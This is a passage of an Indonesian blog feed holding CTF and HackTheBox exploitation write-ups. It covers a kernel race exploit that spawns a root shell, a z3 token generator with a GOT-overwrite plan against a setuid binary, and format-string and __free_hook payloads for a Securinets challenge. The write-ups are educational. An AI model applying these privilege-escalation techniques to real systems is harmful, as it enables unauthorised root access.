    <span class="n">memcpy</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">password</span><span class="p">,</span> <span class="n">ADMIN_PASSWORD</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ADMIN_PASSWORD</span><span class="p">));</span>

    <span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">t_id</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">race_thread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="k">for</span> <span class="p">(;;)</span> <span class="p">{</span>
        <span class="n">req</span><span class="p">.</span><span class="n">uid</span> <span class="o">=</span> <span class="n">ADMIN_UID</span><span class="p">;</span>

        <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">req</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">req</span><span class="p">));</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Jalankan di-server dan root didapatkan :)</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/ <span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>
...
/ <span class="nv">$ </span>/tmp/hax
/ <span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>
...
/ <span class="c"># cat /flag</span>
HTB<span class="o">{</span>XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX<span class="o">}</span>
/ <span class="c">#</span>
</code></pre></div></div>

<h2 id="0x04-penutup">0x04 Penutup</h2>

<p>Pada awalnya bingung dengan multithread di <code class="language-plaintext highlighter-rouge">C</code> karena agak aneh diawal karena thread tidak jalan bersamaan, ternyata ada yang salah dikode aku. Great challenge! buatku yang baru pertama kali mengerjakan soal kernel exploitation.</p>

<p>Thanks.</p>

<p><a href="/2022/08/26/kern-adv-part-1.html"></a></p>

<p>:helloworld:</p>]]></content><author><name></name></author><summary type="html"><![CDATA[Kernel Adventures, merupakan kernel exploitation yang terdapat disalah satu challenge hackthebox. Ini merupakan challenge kernel pertama yang aku selesaikan. Challenge ini memiliki kesulitan medium jadi mungkin ini masih tergolong mudah.]]></summary></entry><entry><title type="html">HTB: Overgraph - Binary Exploitation Part</title><link href="http://localhost:4000/2022/07/19/htb-overgraph-pwn-part.html" rel="alternate" type="text/html" title="HTB: Overgraph - Binary Exploitation Part" /><published>2022-07-19T15:57:28+07:00</published><updated>2022-07-19T15:57:28+07:00</updated><id>http://localhost:4000/2022/07/19/htb-overgraph-pwn-part</id><content type="html" xml:base="http://localhost:4000/2022/07/19/htb-overgraph-pwn-part.html"><![CDATA[<h2 id="0x01-overview">0x01 Overview</h2>

<p>Beberapa minggu yang lalu, aku diminta untuk mengerjakan soal pwn pentest dari machine yang terdapat pada <a href="http://www.hackthebox.com/">HackTheBox</a> oleh temanku. Karena ada waktu buat bantu ngerjain maka aku coba soalnya. Dan karena machine-nya memiliki kategori <code class="language-plaintext highlighter-rouge">hard</code> jadi disuruh juga buat writeupnya.</p>

<p>Binary merupakan ELF 64-bit dan running di mesin <code class="language-plaintext highlighter-rouge">ubuntu</code> dengan libc version <code class="language-plaintext highlighter-rouge">2.25</code> yang digunakan untuk membuat report suatu pesan. Report ini akan menulis pesan ke <code class="language-plaintext highlighter-rouge">/opt/crv/&lt;name&gt;</code>.</p>

<p>Berikut contoh tampilan program,</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./nreport
Custom Reporting v1

Enter Your Token: &lt;SOME_VALID_TOKEN&gt;
Enter Name: &lt;NAME&gt;

Welcome &lt;NAME&gt;
1.Create New Message
2.Delete a Message
3.Edit Messages
4.Report All Messages
5.Exit
&gt;
</code></pre></div></div>

<h2 id="0x02-reversing-the-binary">0x02 Reversing the Binary</h2>

<p>Binary tidak memiliki fungsi-fungsi yang rumit, sehingga dapat dengan mudah untuk di-reversing.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
    <span class="p">...</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Custom Reporting v1</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">auth</span><span class="p">(</span><span class="o">&amp;</span><span class="n">token</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Welcome %s"</span><span class="p">,</span> <span class="n">userinfo1</span><span class="p">,</span> <span class="n">argv</span><span class="p">);</span>
    <span class="k">do</span>
    <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">1.Create New Message</span><span class="se">\n</span><span class="s">2.Delete a Message</span><span class="se">\n</span><span class="s">3.Edit Messages</span><span class="se">\n</span><span class="s">4.Report All Messages</span><span class="se">\n</span><span class="s">5.Exit"</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">);</span>
        <span class="n">scanf</span><span class="p">(</span><span class="s">" %1[^</span><span class="se">\n</span><span class="s">]"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
        <span class="n">choice</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">while</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">&gt;</span> <span class="mi">5</span> <span class="p">);</span>
    <span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="token-authentication">Token Authentication</h3>

<p>Pengecekan token input dari user terdapat pada fungsi <code class="language-plaintext highlighter-rouge">auth</code> yang terdapat pada binary. Berikut hasil dekompilasi fungsi <code class="language-plaintext highlighter-rouge">auth</code> yang sudah dirapikan.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"Enter Your Token: "</span><span class="p">);</span>
<span class="n">fgets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">token</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span>

<span class="k">if</span> <span class="p">(</span> <span class="n">strlen</span><span class="p">(</span><span class="o">&amp;</span><span class="n">token</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">15</span> <span class="p">)</span>
    <span class="k">goto</span> <span class="n">INVALID_TOKEN</span><span class="p">;</span>

<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">13</span><span class="p">;</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="o">--</span><span class="n">i</span> <span class="p">)</span>
    <span class="n">hash</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">token</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">^</span> <span class="n">token</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">^</span> <span class="n">token</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">^</span> <span class="n">token</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">^</span> <span class="n">token</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">^</span> <span class="n">secret</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>

<span class="k">if</span> <span class="p">(</span><span class="n">hash</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">hash</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">hash</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">308</span><span class="p">)</span>
    <span class="k">goto</span> <span class="n">INVALID_TOKEN</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span><span class="n">hash</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">+</span> <span class="n">hash</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="n">hash</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">325</span><span class="p">)</span>
    <span class="k">goto</span> <span class="n">INVALID_TOKEN</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span><span class="n">hash</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">+</span> <span class="n">hash</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">+</span> <span class="n">hash</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">265</span><span class="p">)</span>
    <span class="k">goto</span> <span class="n">INVALID_TOKEN</span><span class="p">;</span>
<span class="p">...</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"Enter Name: "</span><span class="p">,</span> <span class="mi">19</span><span class="p">);</span>
<span class="n">scanf</span><span class="p">(</span><span class="s">" %39[^</span><span class="se">\n</span><span class="s">]"</span><span class="p">,</span> <span class="n">userinfo1</span><span class="p">);</span>
<span class="p">...</span>
</code></pre></div></div>

<p>Seharusnya alur pengecekan token sudah lebih jelas untuk mendapatkan token yang valid,</p>

<ul>
  <li>Token harus memiliki panjang 15 karakter.</li>
  <li>Nilai <code class="language-plaintext highlighter-rouge">hash</code> merupakan hasil xor antara beberapa byte dari token dan <code class="language-plaintext highlighter-rouge">secret[i]</code> dengan nilai <code class="language-plaintext highlighter-rouge">i</code> yang selaras dengan index dari <code class="language-plaintext highlighter-rouge">hash</code>.</li>
  <li>Nilai dari beberapa <code class="language-plaintext highlighter-rouge">hash</code> merupakan nilai yang digunakan untuk pengecekan token yang valid.</li>
  <li>Jika pengecekan token lolos, maka akan ada inputan name yang akan disimpan pada <code class="language-plaintext highlighter-rouge">userinfo1</code>, dan jika gagal maka program akan exit.</li>
</ul>

<p>dah.</p>

<h3 id="generating-token-authentication">Generating Token Authentication</h3>

<p>Token dapat mudah digenerate dengan <code class="language-plaintext highlighter-rouge">z3</code> algebra-solver.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">z3</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># secret didapatkan pada binary.
</span><span class="n">secret</span> <span class="o">=</span> <span class="p">[</span>
    <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span>
    <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span>
    <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span>
    <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span>
<span class="p">]</span>

<span class="n">s</span> <span class="o">=</span> <span class="nc">Solver</span><span class="p">()</span>
<span class="n">t</span> <span class="o">=</span> <span class="p">[</span><span class="nc">BitVec</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">t!</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="sh">'</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">5</span><span class="p">)]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">t</span><span class="p">)):</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="nc">And</span><span class="p">(</span><span class="n">t</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mh">0x61</span><span class="p">,</span> <span class="n">t</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mh">0x7a</span><span class="p">))</span>

<span class="n">xored</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">t</span><span class="p">)):</span>
    <span class="n">xored</span> <span class="o">^=</span> <span class="n">t</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

<span class="n">s</span><span class="p">.</span><span class="nf">add</span><span class="p">((</span><span class="n">xored</span> <span class="o">^</span> <span class="n">secret</span><span class="p">[</span> <span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="n">xored</span> <span class="o">^</span> <span class="n">secret</span><span class="p">[</span> <span class="mi">1</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="n">xored</span> <span class="o">^</span> <span class="n">secret</span><span class="p">[</span> <span class="mi">2</span><span class="p">])</span> <span class="o">==</span> <span class="mi">308</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">add</span><span class="p">((</span><span class="n">xored</span> <span class="o">^</span> <span class="n">secret</span><span class="p">[</span> <span class="mi">7</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="n">xored</span> <span class="o">^</span> <span class="n">secret</span><span class="p">[</span> <span class="mi">8</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="n">xored</span> <span class="o">^</span> <span class="n">secret</span><span class="p">[</span> <span class="mi">9</span><span class="p">])</span> <span class="o">==</span> <span class="mi">325</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">add</span><span class="p">((</span><span class="n">xored</span> <span class="o">^</span> <span class="n">secret</span><span class="p">[</span><span class="mi">11</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="n">xored</span> <span class="o">^</span> <span class="n">secret</span><span class="p">[</span><span class="mi">12</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="n">xored</span> <span class="o">^</span> <span class="n">secret</span><span class="p">[</span><span class="mi">13</span><span class="p">])</span> <span class="o">==</span> <span class="mi">265</span><span class="p">)</span>

<span class="k">while</span> <span class="n">s</span><span class="p">.</span><span class="nf">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">sat</span><span class="p">:</span>
    <span class="n">m</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">model</span><span class="p">()</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">t</span><span class="p">)):</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="nc">Or</span><span class="p">(</span><span class="n">t</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="n">m</span><span class="p">[</span><span class="n">t</span><span class="p">[</span><span class="n">i</span><span class="p">]]))</span>

    <span class="n">token</span> <span class="o">=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="nf">chr</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="nf">as_long</span><span class="p">())</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">t</span><span class="p">])</span>
    <span class="n">token</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">token</span><span class="p">[</span><span class="si">:</span><span class="mi">3</span><span class="p">]</span><span class="si">}</span><span class="s">______</span><span class="si">{</span><span class="n">token</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="si">}</span><span class="s">___</span><span class="si">{</span><span class="n">token</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="si">}</span><span class="sh">"</span>

    <span class="nf">print</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
</code></pre></div></div>

<p>Jalankan dan akan mendapatkan banyak token yang bisa digunakan.</p>

<h3 id="where-is-the-bug">Where is the bug?</h3>

<p>Bug terdapat pada fungsi <code class="language-plaintext highlighter-rouge">edit</code>. Dimana index dari <code class="language-plaintext highlighter-rouge">message</code> yang akan di-edit tidak memiliki batas. Hal ini dapat menyebabkan index out-of-bound. Kita bisa mengedit pointer yang ada disebelum maupun sesudah <code class="language-plaintext highlighter-rouge">message_array</code>.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span> <span class="n">Arryindex</span> <span class="p">)</span>
<span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Enter number to edit: "</span><span class="p">);</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">"%d[^</span><span class="se">\n</span><span class="s">]"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">index</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Message Title: "</span><span class="p">);</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">" %59[^</span><span class="se">\n</span><span class="s">]"</span><span class="p">,</span> <span class="n">message_array</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span> <span class="c1">// oob jika 0 &lt; index &gt; 10</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Message: "</span><span class="p">);</span>
    <span class="n">message_content_ptr</span> <span class="o">=</span> <span class="n">message_array</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">+</span> <span class="mi">60</span><span class="p">;</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">"%100[^</span><span class="se">\n</span><span class="s">]"</span><span class="p">,</span> <span class="n">message_content_ptr</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Sebagai gambaran, bersebelahannya variabel <code class="language-plaintext highlighter-rouge">message_array</code> dan <code class="language-plaintext highlighter-rouge">userinfo1</code>.</p>

<table>
  <thead>
    <tr>
      <th>Variable</th>
      <th>Value</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>message_array[0]</strong></td>
      <td>0x4072c0</td>
    </tr>
    <tr>
      <td>…</td>
      <td>…</td>
    </tr>
    <tr>
      <td><strong>message_array[9]</strong></td>
      <td>0x00000000</td>
    </tr>
    <tr>
      <td>…</td>
      <td>0x00000000</td>
    </tr>
    <tr>
      <td>…</td>
      <td>0x00000000</td>
    </tr>
    <tr>
      <td><strong>userinfo1</strong></td>
      <td>“somename”</td>
    </tr>
  </tbody>
</table>

<p>Bagaimana jika <code class="language-plaintext highlighter-rouge">userinfo1</code> yang menyimpan inputan name kita berisi suatu alamat memori? dan kita mengedit message pada index 12? Maka nilai yang berada pada alamat tersebutlah yang akan diedit.</p>

<h3 id="got-hijacking">GOT Hijacking</h3>

<p>Proteksi yang terdapat pada binary.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE <span class="o">(</span>0x3fd000<span class="o">)</span>
RUNPATH:  b<span class="s1">'/usr/local/bin/Nreport/libc/'</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">RELRO</code> ini adalah suatu proteksi yang membuat suatu section pada binary menjadi read-only. Proteksi ini ada 2 mode: full dan partial.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Full</code> berarti GOT section memiliki permission read-only,</li>
  <li><code class="language-plaintext highlighter-rouge">Partial</code> berarti GOT section memiliki permission writeable.</li>
</ul>

<p>Untuk lainnya, cari sendiri :lol:</p>

<p>Karena binary memiliki address yang tetap (No PIE), artinya kita bisa mendapatkan alamat suatu simbol dari entry got dengan mudah. Dalam kasus ini, kita akan mengoverwrite <code class="language-plaintext highlighter-rouge">free@got</code> ke system. Dan melakukan free atau delete message yang mengandung string <code class="language-plaintext highlighter-rouge">"/bin/sh"</code> untuk mendapatkan shell.</p>

<h3 id="exploit">Exploit</h3>

<p>Karena buffering enabled, maka disini aku hanya tuliskan alur exploitnya saja. Dan karena binary di-mesin memiliki setuid <code class="language-plaintext highlighter-rouge">root</code>, maka kita akan mendapatan <code class="language-plaintext highlighter-rouge">root</code>.</p>

<ol>
  <li>Input valid token yang sudah didapat.</li>
  <li>Input name dengan alamat dari <code class="language-plaintext highlighter-rouge">free@got</code> yaitu <code class="language-plaintext highlighter-rouge">0x404018</code>.</li>
  <li>Create new message dengan dengan title dan content <code class="language-plaintext highlighter-rouge">"/bin/sh"</code>.</li>
  <li>Edit index 12 (OOB) yang akan menunjuk ke buffer name kita yang berisi alamat dari <code class="language-plaintext highlighter-rouge">free@got</code>, menjadi <code class="language-plaintext highlighter-rouge">system@plt</code> pada <code class="language-plaintext highlighter-rouge">0x401080</code>.</li>
  <li>Delete message index 0 tadi yang menyimpan string <code class="language-plaintext highlighter-rouge">"/bin/sh"</code> untuk men-trigger <code class="language-plaintext highlighter-rouge">free</code>.</li>
  <li>Root shell!</li>
</ol>]]></content><author><name></name></author><summary type="html"><![CDATA[0x01 Overview]]></summary></entry><entry><title type="html">Pwn-ing at Securinets Quals 2021</title><link href="http://localhost:4000/2021/03/22/pwning-at-securinets-ctf-2021.html" rel="alternate" type="text/html" title="Pwn-ing at Securinets Quals 2021" /><published>2021-03-22T15:57:28+07:00</published><updated>2021-03-22T15:57:28+07:00</updated><id>http://localhost:4000/2021/03/22/pwning-at-securinets-ctf-2021</id><content type="html" xml:base="http://localhost:4000/2021/03/22/pwning-at-securinets-ctf-2021.html"><![CDATA[<h2 id="overview">Overview</h2>

<p>Soal-soalnya sangat bagus menurutku (karena solved semua aja sih :evillaught:), tapi aku kerjain ini semalam setelah kompetisi selesai. Karena saat kulihat di runing event ctftime, ternyata waktu &lt;1 jam selesai :’(. Aku hanya kerjain bagian Binary Explotation saja dan dibawah ini writeupnya.</p>

<h2 id="kill-shot-810-pts">Kill Shot (810 pts)</h2>

<p>Simplenya, binary ini memberikan kita <code class="language-plaintext highlighter-rouge">printf</code> dengan controlled parameter untuk mendapatkan information leaks, dan fungsi kill yang bisa kita gunakan untuk dapatkan arbitrary write.</p>

<h3 id="the-seccomp">The Seccomp</h3>

<p>Binary ini menggunakan <code class="language-plaintext highlighter-rouge">seccomp</code> untuk filter apa saja <code class="language-plaintext highlighter-rouge">syscall</code> yang diizinkan untuk kita.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">line</span>  <span class="n">CODE</span>  <span class="n">JT</span>   <span class="n">JF</span>      <span class="n">K</span>
<span class="o">=================================</span>
<span class="mi">0000</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000004</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">arch</span>
<span class="mi">0001</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x09</span> <span class="mh">0xc000003e</span>  <span class="nf">if </span><span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">ARCH_X86_64</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0011</span>
<span class="mi">0002</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">sys_number</span>
<span class="mi">0003</span><span class="p">:</span> <span class="mh">0x35</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x40000000</span>  <span class="nf">if </span><span class="p">(</span><span class="n">A</span> <span class="o">&lt;</span> <span class="mh">0x40000000</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0005</span>
<span class="mi">0004</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x06</span> <span class="mh">0xffffffff</span>  <span class="nf">if </span><span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0011</span>
<span class="mi">0005</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x04</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="nf">if </span><span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">read</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0010</span>
<span class="mi">0006</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x03</span> <span class="mh">0x00</span> <span class="mh">0x00000001</span>  <span class="nf">if </span><span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">write</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0010</span>
<span class="mi">0007</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x02</span> <span class="mh">0x00</span> <span class="mh">0x00000005</span>  <span class="nf">if </span><span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">fstat</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0010</span>
<span class="mi">0008</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x01</span> <span class="mh">0x00</span> <span class="mh">0x0000000a</span>  <span class="nf">if </span><span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">mprotect</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0010</span>
<span class="mi">0009</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x00000101</span>  <span class="nf">if </span><span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">openat</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0011</span>
<span class="mi">0010</span><span class="p">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
<span class="mi">0011</span><span class="p">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">return</span> <span class="n">KILL</span>
</code></pre></div></div>

<h3 id="exploit">Exploit</h3>

<p>Information leaks (pie, libc, heap, etc), didapatkan dengan mudah dengan controlled parameter <code class="language-plaintext highlighter-rouge">printf</code> yang sudah aku tulis diatas.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">%4$p||%6$p||%25$p||%13$p</span><span class="sh">'</span>
<span class="n">r</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Format: </span><span class="sh">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">leaks</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="nf">recvline</span><span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">||</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div>

<p>Overwrite <code class="language-plaintext highlighter-rouge">__free_hook</code> ke fungsi <code class="language-plaintext highlighter-rouge">kill</code> pada saat awal program untuk dapatkan infinite arbitrary write.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">r</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">Pointer: </span><span class="sh">'</span><span class="p">,</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__free_hook</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">Content: </span><span class="sh">'</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">kill</span><span class="p">))</span>
</code></pre></div></div>

<p>Arbitrary write ini akan digunakan untuk tulis ropchain ke stack yang akan panggil mprotect untuk membuat heap memory menjadi executable.</p>

<p>Prepare shellcode lalu kalkulasi jarak shellcode diheap dengan leaked heap address tadi yang nantinya ini akan menjadi return address setelah rop dilakukan.</p>

